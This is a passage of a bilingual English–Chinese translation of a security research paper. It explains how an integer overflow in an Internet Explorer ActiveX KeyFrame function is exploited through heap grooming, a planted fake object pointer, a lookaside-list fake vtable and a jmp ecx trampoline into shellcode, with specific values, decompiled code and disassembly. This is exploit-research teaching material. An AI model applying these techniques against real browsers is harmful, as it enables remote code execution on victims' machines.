style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>cleanup:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (npoints &gt; 0)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>// We iterate from 0 to npoints and call a virtual function on all<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>// non-NULL elements of KeyFrameArray-&gt;field_C and TimeFrameArray-&gt;field_C<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>for (i = 0; i &lt; npoints; i++) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>if (KeyFrameArray.field_C[i] != NULL)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                </span>KeyFrameArray.field_C[i]-&gt;func_8();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>if (TimeFrameArray.field_C[i] != NULL)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                </span>TimeFrameArray.field_C[i]-&gt;func_8();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>...<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>return err;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
KeyFrame function multiplies the npoints argument by 16, 8 and 4 and allocates
four buffers. If npoints is greater than 0x40000000 the allocation size will
wrap around and the function will allocate four small buffers. In our exploit,
we'll set npoints to 0x40000801, and the function will allocate buffers of size
0x8018, 0x4008 and two of size 0x<st1:chmetcnv UnitName="C" SourceValue="200"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">200c</st1:chmetcnv>.
We want the smallest buffer to be larger than 0x2000 bytes because smaller
allocations will come from the CMemManager heap instead of the system
allocator.<o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>KeyFrame</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数把</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>npoints</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>参数乘以</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>16,8</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>和</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>4</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>，然后分配了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>。如果</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>npoints</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>大于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x40000000</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的话，实际上就溢出了，程序申请的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>就会过小。在我们这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中，我们把</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>npoints</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>写成</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x40000801</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，这样程序要求分配的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>4</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>buffer</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就只有</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x8018, 0x4008</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>和</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x<st1:chmetcnv UnitName="C"
SourceValue="200" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>。当然我是故意要使最小的那</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>大于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x2000</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的。因为这样这</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>buffer</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就会由</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>CMemManager</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>系列函数，而不是系统的内存分配函数来分配了。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>After
allocating the buffers, the function calls
CSafeArrayOfDoublesAccessor::ToDoubleArray() to initialize the array accessor
objects. If the size of KeyFrameArray is less than npoints, ToDoubleArray will
return E_INVALIDARG. The cleanup code executed in this case will iterate
through the two 0x2004 byte buffers and call a virtual function on each
non-NULL element in the buffer.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在分配了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>之后，这个函数将调用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>CSafeArrayOfDoublesAccessor::ToDoubleArray()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>来初始化对象数组。如果</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>KeyFrameArray</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的大小小于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>npoints</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>，</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ToDoubleArray</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就会直接跳转到</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>INVALIDARG</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>进行异常处理。这段异常处理代码挨个检查</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个较小的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的每一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DWORD</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，如果不是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>NULL</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的话，就把它当成对象指针，并调用对象的虚函数。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>These
buffers are allocated with the HEAP_ZERO_MEMORY flag and contain only NULL
pointers. The code will iterate from 0 to npoints (which is 0x40000801),
however, and will eventually access data past the end of the 0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv> byte buffers. If we control the first
dword after the KeyFrameArray.field_C buffer, we can point it to a fake object
with a pointer to the shellcode in its vtable. The virtual function call to
func_8() will execute our shellcode.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>由于这</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>buffer</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在分配时是使用了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HEAP_ZERO_MEMORY</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>参数的，所以</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中是写满了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NULL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的。但问题是检查的范围是</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>到</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>npoints</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>（也就是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x40000801</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>），所以这个检查会越界，程序会把</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>buffer</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>后面的内存中的数据也当成是</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>buffer</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的数据进行检查。即他会访问</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>之后的数据。我们前面讨论过了，我们能控制</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>KeyFrameArray.field_C</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>buffer</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>之后的一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DWORD</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。我们把它写成指向</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中某一项的一个指针，这样当异常处理代码把这个非</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NULL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DWORD</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>当成一个对象的指针，并调用这个对象的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>func_8()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>虚函数时，我们的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>shellcode</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>就运行了。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h4><span lang=EN-US style='font-family:Verdana;color:#404040'>Exploit<o:p></o:p></span></h4>

<h4><span style='mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;
color:#404040'>利用代码</span><span lang=EN-US style='font-family:Verdana;
color:#404040'><o:p></o:p></span></h4>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
exploit this vulnerability, we need to control the first four bytes after the
0x<st1:chmetcnv UnitName="C" SourceValue="200" HasSpace="False" Negative="False"
NumberType="1" TCSC="0" w:st="on">200c</st1:chmetcnv> byte buffer. First, we
will defragment the heap with blocks of size 0x2010 (the memory allocator
rounds all sizes to 8, so 0x<st1:chmetcnv UnitName="C" SourceValue="200"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">200c</st1:chmetcnv>
gets rounded up to 0x2010). Then we will allocate two 0x2020 byte memory
blocks, write the fake object pointer at offset 0x<st1:chmetcnv UnitName="C"
SourceValue="200" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">200c</st1:chmetcnv>, and free them to the free list.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>利用这个漏洞的关键在于我们要能控制在</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>之后的那个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DWORD</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的数据。首先我们清除堆中</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0x2010</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>级别上的内存碎片（因为我们要分配的是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>大小的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象，这个大小是属于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x2010</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>级别的）。然后我们分配</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x2020</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:red'>（疑为</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:red'>0x2010</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:red'>）</span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>大小的内存块，把我们伪造的对象指针（就是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x151e58</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>），写到偏移</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x<st1:chmetcnv UnitName="C"
SourceValue="200" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>的位置上，然后再把这</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个内存块给释放掉。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>When
the KeyFrame function allocates two 0x<st1:chmetcnv UnitName="C"
SourceValue="200" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">200c</st1:chmetcnv> byte buffers, the memory allocator will reuse our
0x2020 byte blocks, zeroing only the first 0x<st1:chmetcnv UnitName="C"
SourceValue="200" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">200c</st1:chmetcnv> bytes. The cleanup loop at the end of the
KeyFrame function will reach the fake object pointer at offset 0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv> and will call a function through its
virtual table. The fake object pointer points to 0x151e58, which is the head of
the lookaside list for blocks of size 1008. The only entry on the list is our
fake vtable.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>然后当</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>KeyFrame</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>要分配内存时，就会得到刚才那</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x2010</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>大小的内存块的地址。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>KeyFrame</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>会把这</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个内存块</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>～</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x<st1:chmetcnv UnitName="C"
SourceValue="200" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>部分全部写零。但是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>～</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x2010</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的这个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DWORD</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>将被保留下来。当</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>KeyFrame</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的异常处理代码运行的时候，就会把</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>～</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x2010</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的这个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DWORD</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>当成对象的指针，然后调用这个函数的虚函数，进而运行我们的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
code that calls the virtual function is:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面这段代码就是运行我们的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的关键几步：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>.text:100071E4<span style='mso-spacerun:yes'>                 </span>mov<span style='mso-spacerun:yes'>     </span>eax, [eax]<span style='mso-spacerun:yes'>      </span>; object pointer<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>.text:100071E6<span style='mso-spacerun:yes'>         </span><span style='mso-spacerun:yes'>        </span>mov<span style='mso-spacerun:yes'>     </span>ecx, [eax]<span style='mso-spacerun:yes'>      </span>; vtable<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>.text:100071E8<span style='mso-spacerun:yes'>                 </span>push<span style='mso-spacerun:yes'>    </span>eax<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>.text:100071E9<span style='mso-spacerun:yes'>                 </span>call<span style='mso-spacerun:yes'>    </span>dword ptr [ecx+8]<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
virtual call is through ecx+8, and it transfers execution to a jmp ecx
trampoline in IEXPLORE.EXE. The trampoline jumps back to the beginning of the
vtable and executes the shellcode. For more detailed information about the
vtable, refer to the previous <a
href="http://www.determina.com/security.research/presentations/bh-eu07/bh-eu07-sotirov-paper.html#vtable">section</a>.
<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>由于调用的是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>func_8()</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>也就是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ecx+8</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>处所指的函数，由于我们的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>shellocde</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中这里写入的是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>jmp ecx</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的地址，所以程序就会去执行</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>jmp ecx</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>结果就跳回了我们的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>shellcode</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的头部，进而一步一步的执行</span><span
